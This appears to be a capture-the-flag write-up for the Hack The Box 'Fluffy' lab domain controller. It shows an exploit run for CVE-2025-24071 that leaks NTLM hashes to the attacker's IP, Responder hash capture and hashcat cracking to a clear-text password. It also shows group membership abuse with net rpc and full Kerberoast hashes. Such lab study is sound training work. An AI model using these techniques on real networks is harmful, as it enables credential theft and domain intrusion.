### HTB Fluffy 

## Windows - Easy - 10 points

# Enumeration 

We are provided credentials for a user j.fleischman

```bash
# Nmap 7.94SVN scan initiated Mon Sep  1 09:09:15 2025 as: nmap -sCV -oN nmap.txt -v 10.10.11.69
Nmap scan report for 10.10.11.69                                                               
Host is up (0.0080s latency).                                                                                                                                                                 
Not shown: 990 filtered tcp ports (no-response)                    
PORT     STATE SERVICE       VERSION                                                           
53/tcp   open  domain        Simple DNS Plus                                                                                                                                                  
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-01 21:09:26Z)    
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn                                     
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-01T21:10:46+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb 
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb 
| Issuer: commonName=fluffy-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
|_SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-01T21:10:46+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb 
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
|_SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-01T21:10:46+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb 
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb 
| Issuer: commonName=fluffy-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
|_SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb 
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb 
| Issuer: commonName=fluffy-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
|_SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
|_ssl-date: 2025-09-01T21:10:46+00:00; +7h00m00s from scanner time.
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-01T21:10:09
|_  start_date: N/A
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

We have read/write access to an IT share

<img width="1552" height="335" alt="image" src="https://github.com/user-attachments/assets/23ccba43-30f8-41ea-97f2-1f5310690366" />

We find a Upgrade_Notice.pdf in the IT share

<img width="1588" height="857" alt="image" src="https://github.com/user-attachments/assets/7683fb81-3e81-49d3-8caf-07fd3150075f" />

Interesting find was - CVE-2025-24071 as we have write access to the share we can try to exploit this,

Exploit info - <em> Windows Explorer automatically initiates an SMB authentication request when a .library-ms file is extracted from a .rar archive, leading to NTLM hash disclosure. The user does not need to open or execute the file—simply extracting it is enough to trigger the leak. </em>

POC for [CVE-2025-24071](https://github.com/0x6rss/CVE-2025-24071_PoC)

```bash
└──╼ $python3 poc.py                                                                                                                                                                          
Enter your file name: test                                                                                                                                                                    
Enter IP (EX: 192.168.1.162): 10.10.14.23                                                                                                                                                     
completed
```

```bash
└──╼ $7z l exploit.zip                                                                                                                                                                        
                                                                                                                                                                                              
7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21                                                                                                                           
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,128 CPUs AMD EPYC 7543 32-Core Processor                 (A00F11),ASM,AES-NI)                                           
                                                                                                                                                                                              
Scanning the drive for archives:                                                                                                                                                              
1 file, 317 bytes (1 KiB)                                                                                                                                                                     
                                                                                                                                                                                              
Listing archive: exploit.zip                                                                                                                                                                  
                                                                                                                                                                                              
--                                                                                                                                                                                            
Path = exploit.zip                                                                                                                                                                            
Type = zip                                                                                                                                                                                    
Physical Size = 317                                                                                                                                                                           
                                                                                                                                                                                              
   Date      Time    Attr         Size   Compressed  Name                                                                                                                                     
------------------- ----- ------------ ------------  ------------------------                  
2025-09-01 10:30:02 .....          365          189  test.library-ms                           
------------------- ----- ------------ ------------  ------------------------                  
2025-09-01 10:30:02                365          189  1 files  
```

Now log into the IT SMB share and upload the zip, start responder on the VPN interface which in my case is the tun0 interface

after 2 minutes, we get a hash on the responder for the user p.agila

```bash
[+] Listening for events...                                                                    
                                                                                               
[SMB] NTLMv2-SSP Client   : 10.10.11.69                                                        
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila                                                     
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:de6a080f02578f0a:0056575F6F264104B524503449C0DC40:0101000000000000004819ED211BDC0120D22C7B410047880000000002000800590033003000330001001E0057004900
4E002D00370054004F0030004A0059005300330047004E00330004003400570049004E002D00370054004F0030004A0059005300330047004E0033002E0059003300300033002E004C004F00430041004C000300140059003300300033002E
004C004F00430041004C000500140059003300300033002E004C004F00430041004C0007000800004819ED211BDC01060004000200000008003000300000000000000001000000002000002AD550DB7F3C763675E2459C985716653577261D
C57A365037FE2FF11ECC92C70A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320033000000000000000000
```

Cracking the hash using hashcat we get a clear text password

```bash
P.AGILA::FLUFFY:de6a080f02578f0a:0056575f6f264104b524503449c0dc40:0101000000000000004819ed211bdc0120d22c7b410047880000000002000800590033003000330001001e00570049004e002d00370054004f0030004a00
59005300330047004e00330004003400570049004e002d00370054004f0030004a0059005300330047004e0033002e0059003300300033002e004c004f00430041004c000300140059003300300033002e004c004f00430041004c00050014
0059003300300033002e004c004f00430041004c0007000800004819ed211bdc01060004000200000008003000300000000000000001000000002000002ad550db7f3c763675e2459c985716653577261dc57a365037fe2ff11ecc92c70a00
1000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320033000000000000000000:prometheusx-303
                                                           
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: P.AGILA::FLUFFY:de6a080f02578f0a:0056575f6f264104b5...000000
Time.Started.....: Mon Sep  1 10:33:13 2025 (2 secs)
Time.Estimated...: Mon Sep  1 10:33:15 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  1934.3 kH/s (0.83ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4517888/14344385 (31.50%)
Rejected.........: 0/4517888 (0.00%)
Restore.Point....: 4515840/14344385 (31.48%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#2....: proretriever -> progree

Started: Mon Sep  1 10:33:02 2025
Stopped: Mon Sep  1 10:33:17 2025
```

We can test the credentials on the box using nxc

```bash
└──╼ $nxc smb fluffy.htb -u p.agila -p 'prometheusx-303' --shares
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\p.agila:prometheusx-303 
SMB         10.10.11.69     445    DC01             [*] Enumerated shares
SMB         10.10.11.69     445    DC01             Share           Permissions     Remark
SMB         10.10.11.69     445    DC01             -----           -----------     ------
SMB         10.10.11.69     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.69     445    DC01             C$                              Default share
SMB         10.10.11.69     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.69     445    DC01             IT              READ,WRITE      
SMB         10.10.11.69     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.69     445    DC01             SYSVOL          READ            Logon server share
```

Running sharphound using nxc ldap and injesting the output in bloodhound we find something interesting

<img width="1119" height="634" alt="image" src="https://github.com/user-attachments/assets/0d2b0278-5b66-446c-ba71-27bf348dde21" />

We can add p.agila to the Service Accounts group using the net rpc command and then perform a targetedKerberoast attack on the winrm_svc user to grab the NTLM hash

Right click on the edges on bloodhound to grab the commands

```bash
└──╼ $net rpc group addmem "Service Accounts" "p.agila" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S "fluffy.htb"
```

Download targetedKerberoast.py from the [GitHub Repository](https://github.com/ShutdownRepo/targetedKerberoast.git)

But after running the attack we get a clock skew error, we can fix this using ntpdate,

We get 3 hashes for the 3 accounts, the Service Accounts group has a generic write on all these 3 service accounts

```bash
$krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$30c127e6401b5efc9d49c76328f44315$0ac2b3a8d7c109ce1bca7016a2bc7a8afda523ace8db89d5e6d1c32252281c734a31d2fb0361aa73a3f617daad477b5456fc133a308
c928a718d89e1cdc03ff93ce3394f069a05472e85ff0c9e163af7c502e50650b7665a661e106bffcf4f58ff7476a3daf5e80d4262a8e08e473e591add93f54ceffe1b5dbdb398550614897f735a59056632d95888a80965b35a15105077b5f
0690cf01af3521edf6eefff894695c7c13cee63d15bf587f7651dd497b9fad5c66ad22d595e81b5619cfae8ab1c6629b772020aa1674034a9cc6533fcff6388b40dc1fc57111d622d86640e873cc4905d9f41466f26dcd64487ee03f88b78c
2095f2cec8564c1ca9c9df762628083ccfd9303704a7ec53d6ea33ac9f55cde08044e00f2ab756de1cfa82ae252199b77564a28eca6ee494f4538a034e73fa995d69645d127980abe3deb90606080c2a3289229d46795c4c0b62e6041cc047
b47f5da9ec8044ade04fd67fe291a2167b0fb254b4af2dbc63ce1d0cde2651f87cbc513f754d8a5bb0c0382f2818e391b9f156f3c2607050f0cb01ed0caa7734a62b636b5dc7770c48daed0d9c1a4c2f12c8cfab1f9f15598968720b30fcfa
83b95b55e52dbc8c7d351d824f141fad8db6e21ee3cf7d73214b35753efacdc53883f81a233369a8a3e962b39115845a5a5f169beb117ad831941db6da2edaf7d5deacab0f84141692deb217571ce74ca8c1b63441244143dfdfbe159cda3d
73fe253970c7bb48d031513eab833238945232f13556d5fbcfb344303fc00ca051d53058a165da5cd2b8ded9a284d050c5c23d4acee13b5f215521ab110f2a6a988b5203fc413d94f82ad2cbac404b1ca3308a156befeaae1beafcb13cb9fd
cb05a2aaa80ccdb78167f3d090c5dc68d74b83708534c923aa669cdae09b394b09f8872a7bbfdabf89913b60a9888d3618415b577e1c32e5652eefadcf8666c9776d2e219853a0a6ec47c1b33767cbcfaa11f6cc6467af88930fa42406c297
392cc0d73e1d870096b92b6e2268ad77aec8e5e77f10315935d1510fe1f245274a48906ab7d09caa45d4e626d271cde560d3b5dd34b352982ebf2e0e0b2fb8e250a5dbb4c01a709e8e1f1f89e7b9264428126f267238265d3225816377d776
df64434df8061c734470059d4b4fdf6ed70da19555094ac169b7289d065bc0c44cdff0c3aef461449d25fb7da14465a688ff3a1a4cfb8e03f971ef7bbe6a6fac605cd3614af6912fe4c1a4d26cb5db52e64dee0dc8a7beef97bf9bed592c41
41fcd909158630e6938974c794628fc1de1f4356b458a45b041be75c493f7a8952b279c09167ec7e21a08fec162f5752980e362995d826be2d32140a4267d80a0b55e16a520c199ac371c3bd7472346f7810fb5e8a9cc062566cda462a7a6f
aca20f885a06a4f5a9127b1bf64a3505b7de6092e4f1306fad0f83c9857d4c0f4f78d9abbfd7539bee668573da4a23d185505999b8238f2b7d9d31a82fd5d

$krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb/ldap_svc*$3a9994c992502bbe7c6714a89d5f3af5$ef14dfccfb6f069a536dfbd6c6dd6d52dfa5f1ba2842fb96038287618cf61508f37d61b0db2059ddaca0264eec367d213fc1313
a138099f55c06a3ae1b2784e06a6ba85246ac66fe06990b9fa1ea05c27f4167f1b40818811fce61e1b8931fc6cc16f212abb66c49e6247e651c8b465734bf7f6e8269dbcd9db4394d2e0f50c4b8966b1cee3acf1323920ac255f89d5c794d0
d7714a4ec59e527244c3098c17b39055fb30d9a82a3dbc25c8cdfe2b9f622db8802785f5ee3ac61696733a9a6a604a747755c2b900d9483e50d503d02300b6d2f75a94febb46a1d16c7db0095c854b48e7566e1ee9cbfadc6bc01a622d3552
f2ea56251ec846d56bf6cc3ba01d47f3b7af51b87ec3ac9b9c133ceb26015c73e27cfca83f0bd014ec1be3ffdcc94989cc99112dc65ca8f6c62b4c78a07b85c20e9f4c7631820656f4b50157c66b853a9e067520cb8503243cb10e9fa2469a
8f5675238842499d76aab6f2941cfc7ff053e25390fff8556556b257840099c44d48a8126e53d776daca3de977349a0623300e090382938b2a5afaaeebfc52e622222c1e5d84ce96470a8647e1798217be68d50255ee11900ff65696467159
4becef1ad7d265b3a966c6734aa5fd42a027663647078fb3727ff735808530339eb96c140134aad3802e0b26ce856418f361b134b0c09ef194e2de3a17d97016b88759a54eadccfe26a67c39ffa6b4b009481ec750794f4a08ea8d9aed8749
1961d88840566e17591e76dd5bda3c195a6f4ee1143e1c0b021c2bbb2bce5cfc1d3b1710ec3bc31056eb6e9f923f345c40576df227353f4d979d11f9d85c39c50a588a669e9856c530f870795df17852567ceda4e902db6c5296bc11194573
4a996dfce177339c4caa8721dd64fa17263891bc450a46a01df5238b5a3a145e1a111567d8eda0f84877b05e67a676f81819c52738686bccccb92570e3f88108a5fc4b7aa63c76f82ecca8217f7b26428357b001f9a0825548182c0f425ee0
c88cc5b5f405bd6e9a8ab019f8a85025c5fb25bf1bf204e6c4967eb9da0fa642352d0668039eb9e75a94623908ba51547b76f79c0118b824436349818723cfd28061b9c43d21c851e065201e4669df505a6f88849a0469b13076aabd88e1f3
b08144b5c4e748caf09af47b6d1a18bacb1205f6df8ff01450b48b44b71262ba156fc451baf9ac101fa7cf53ee1ca4062b7d97b71ecddc8535b25ced00f9844960d66cc0a944374609dd6d489d7ccb3164c5bdfe94eda503911ac01a23f301
1513cb67ee54f2057d9f718097d44511bcd4da26305477ff367e627d7e56c724c4f569284d58d8024e602ce8dac2f69622f7e149682301d75f45768a354c7dc36924359e65dec3b891038b30eaf7f40477cf6f49ec09fcf0a0db2122c690bb
1a3f40baff1cd89cc3ff8dbf244b94e459f1e3535f35649bfdb1b215edbc02891e9287d8b1b6b6bf0e2d8323ad9f322bdb16c4c82082ec3a01bfe143d4e4b8bf2

$krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb/winrm_svc*$0e6147c5da828bb3bfba4b70bd2fb893$fa76b836cba7e5afbea6ab2e20885dfadbeff89d6ed83c368d10cf7b0593f0adacb230338014c559a2a5c098be28b1776104f
0114b3387d6898222f62b1afe41d1a31336b25491cf8b067d7dd8ce95514921d7e6d119cf9727787f7cdfb87949c875b8e4591d2a290423da2e099b0cef447f1ccff476c2f6f1508dd0f266be21538856be989571e24abedb64bf85471e21b
c6afc9647ff1fedccd8d4643af42607052f6054cb121ddee0ca51af89c3e702a20721408bc715150ba3590ad20aab71014a3bd5353a239d3d526edcb22ed6c3e41d4aa7a10e3dbb305ff47f6f3fa4ce7f25b5db95d01d273ad642bbc0be062
d0f3c2f17ef5636613572c242f84ccfab23425c19bb5aa5b61182ffd5470ec2c23823adcf94a3377bcc6f3f083d26d4a2f40c21fc0517923fd8fbd174e53c485aca4f882838b45b2a453fc64fda142a884538c220010450949553af1d5c976
a1e7916b3d655022437e7c98423b5d7120bef17c6f54801cb04ab3de4c54bc8e26a7d1fdcd46e4ccbd73a02ef49bcba26f74a2bdfa993324f466b116dbc869c28c9e7cb7f559a85bbd2d8a2942db76bebf543c9a08f2da85c3e8d11292cad0
54067e777b279b3ac69490abf8398df12896b3424d40a4616533977975ac659a6bc7a36038e9afb2c3f1a8fe3e9b0f05b6cd3416cac34531c3bc7c16027c0490d2584ef4d4e75fe1e861accd5adb1951449f6f791d2fe29efade59f323214b
882d72440cc38cc90ae60ad6ad4ffaf2a90c461e7458abd92d0508f827f9155b9d43fa34db57ca63b8f70bfa1f7fea3fdfecb17c5609795a3fab0460e35eb6ad7725940bcd4b6204584975a40a466b92f9b53b4ba1bbb14b75f6aa85265bda
c5a3d1a68839cd646d847f2b180b639d583d5e55c3ca54c1c52cf3721145e21c219aacdd350c94353cb6666a573d8033992ea96c9cfb63bfd31a907307904dd41a82308284b98bf389198f4ce496f277403d447d8fd2ac88354d5492307cc5
cf8b92c2f89215a25b41b40de430aaa7228a5538c4a6666ba179067078df31f5d09f012e48be1e2f720e23ed776c0de4131c79ff65b768ee554f7d71d896c42b61998a7966af46811e0e3466a2a842f0ecd4a47f8886a39cca23181da60837
a962f75f3ff222482016dcab8ae23509dfa4bbe23015efb34570643fd320e2fde6942ec12e951295bf66208668275c656da691ebb33b3eab283a41f9e20a9b6f9170523a21079faee3db4132311c7b13c0ffa817fb7376ff1a2fe36fbe3689
9f78bd970588436fd4e390f6b9466533e864b37a82e84f1d6bf248c6c788695ff120f5c209a247451d6af477f96fc0efbb1442b11f98f7f0104509b513192cc04bfef19a2339ec741d6d20c87c13ab7f2caf55ffb40dbf9aba1cb0b6415869
16743434c7cfac96befa4d7df7daa00ac74ae37fbb6e2f0607aeff7291cf4cafb0a032c5c0c359721f2dba508112e9a9e7ae1e20eea1811a999d2aae11346fcde02

```
